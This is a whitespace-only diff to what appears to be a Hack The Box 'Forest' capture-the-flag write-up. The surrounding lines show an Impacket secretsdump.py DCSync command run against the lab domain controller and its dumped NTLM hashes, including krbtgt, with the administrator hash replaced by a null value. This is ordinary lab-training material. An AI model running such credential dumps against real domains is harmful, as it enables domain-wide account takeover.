@@ -132,7 +132,7 @@ lets do a secretsdump.py since we have the rights now
 ```text
 secretsdump.py -dc-ip 10.10.10.161 htb.local/foo1@FOREST                                                                                                                                                                                 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                                                                                                                                                     
-                                                                                                                                                                                                                                             
+
 Password:                                                                                                                                                                                                                                    
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                                                                           
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                                
@@ -140,7 +140,7 @@ Password:
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::                                                                                                                                             
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                               
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                                                                              
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
 there we go, now we should have all the hashes \(replaced the admin hash with null one\)
